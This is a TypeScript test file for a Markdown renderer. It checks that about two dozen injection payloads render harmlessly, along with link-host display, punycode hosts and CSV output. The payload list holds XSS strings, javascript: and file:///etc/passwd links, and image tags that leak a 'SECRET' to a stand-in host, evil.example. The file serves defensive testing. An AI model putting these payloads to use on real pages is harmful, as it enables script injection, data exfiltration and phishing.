// The renderer's markup corpus: answers that carry markup payloads render no script, no handler, no remote load, no
// dangerous link and no raw HTML element.
import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { isBareAddress, linkHost, Markdown, safeUrl, toCsv } from '../Markdown';

const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />);

const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror="alert(1)">',
  '<svg onload="alert(1)"><circle /></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<style>body{display:none}</style>',
  '<form action="https://evil.example"><input name="pw"></form>',
  '<a href="https://evil.example">raw html link</a>',
  '<details open ontoggle="alert(1)">x</details>',
  '<object data="https://evil.example/x.swf"></object>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '[click](javascript:alert(1))',
  '[click](JaVaScRiPt:alert(1))',
  '[click](jav&#x61;script:alert(1))',
  '[click](data:text/html,<script>alert(1)</script>)',
  '[click](vbscript:msgbox)',
  '[click](file:///etc/passwd)',
  '[click](chrome://settings)',
  '[click](chrome-extension://abc/options.html)',
  '[ref][1]\n\n[1]: javascript:alert(1)',
  '![pixel](https://evil.example/p.png?d=SECRET)',
  '![pixel](data:image/png;base64,AAAA)',
  '<img src="https://evil.example/p.png?d=SECRET">',
  '| a | b |\n| - | - |\n| <script>x</script> | <img src=x onerror=alert(1)> |',
  '<div style="position:fixed;inset:0">overlay</div>',
  '<button onclick="alert(1)">Approve</button>',
];

describe('markup corpus', () => {
  it.each(PAYLOADS)('renders %j safely', payload => {
    const html = render(payload);
    expect(html).not.toMatch(/<(script|iframe|style|form|object|embed|meta|svg|details|div style)/i);
    // The renderer's own buttons (image placeholder, Copy) are allowed; a page's button never renders.
    expect(html).not.toMatch(/<button[^>]*>Approve/);
    expect(html).not.toMatch(/\son\w+=/i);
    expect(html).not.toMatch(/(href|src)="\s*(javascript|data|vbscript|file|chrome|chrome-extension):/i);
    // No image is loaded until the user clicks: nothing renders an <img>.
    expect(html).not.toMatch(/<img/i);
    // Raw HTML never becomes an element.
    expect(html).not.toMatch(/<a [^>]*>raw html link/);
    expect(html).not.toContain('position:fixed');
  });

  it('shows a link with its host, and keeps a bare address as text', () => {
    expect(render('[Reset your password](https://accounts.evil.example/reset)')).toContain('(accounts.evil.example)');
    expect(render('Visit https://bare.example/path now')).not.toContain('<a ');
    expect(render('<https://angle.example>')).not.toContain('<a ');
    expect(render('[https://same.example](https://same.example)')).not.toContain('<a ');
    expect(render('[docs](https://docs.example/x)')).toContain('href="https://docs.example/x"');
    // Link text that names another host: the real host is shown beside it.
    const disguised = render('[https://bank.example/login](https://evil.example/x)');
    expect(disguised).toContain('(evil.example)');
    expect(disguised).toContain('href="https://evil.example/x"');
    // Text that only contains the real host still shows it.
    expect(render('[paypal.com](https://pal.com/login)')).toContain('(pal.com)');
    expect(render('[Log in at pal.com today](https://pal.com/login)')).toContain('(pal.com)');
    expect(render('[docs.example/guide](https://docs.example/x)')).not.toContain('(docs.example)');
  });

  it('shows a button in place of a remote image', () => {
    expect(render('![chart](https://img.example/c.png)')).toMatch(/<button[^>]*>.*img\.example/);
  });

  it('renders tables, with Copy and Save as CSV', () => {
    const html = render('| Model | Price |\n| --- | --- |\n| XPS | 1,299 |');
    expect(html).toContain('<table');
    expect(html).toContain('Save as CSV');
  });
});

describe('helpers', () => {
  it('allows http, https and mailto only', () => {
    expect(safeUrl('https://a.example/x')).toBe('https://a.example/x');
    expect(safeUrl('mailto:a@b.example')).toBe('mailto:a@b.example');
    expect(safeUrl('javascript:alert(1)')).toBe('');
    expect(safeUrl('/relative')).toBe('');
  });

  it('shows a non-ASCII host in punycode', () => {
    expect(linkHost('https://аpple.example/')).toBe('xn--pple-43d.example');
  });

  it('recognises a bare address', () => {
    expect(isBareAddress('https://a.example/', 'https://a.example')).toBe(true);
    expect(isBareAddress('a.example', 'https://a.example/')).toBe(true);
    expect(isBareAddress('Click here', 'https://a.example/')).toBe(false);
  });

  it('writes CSV with quoting', () => {
    expect(
      toCsv([
        ['a', 'b,c'],
        ['"q"', 'x'],
      ]),
    ).toBe('a,"b,c"\n"""q""",x');
  });
});
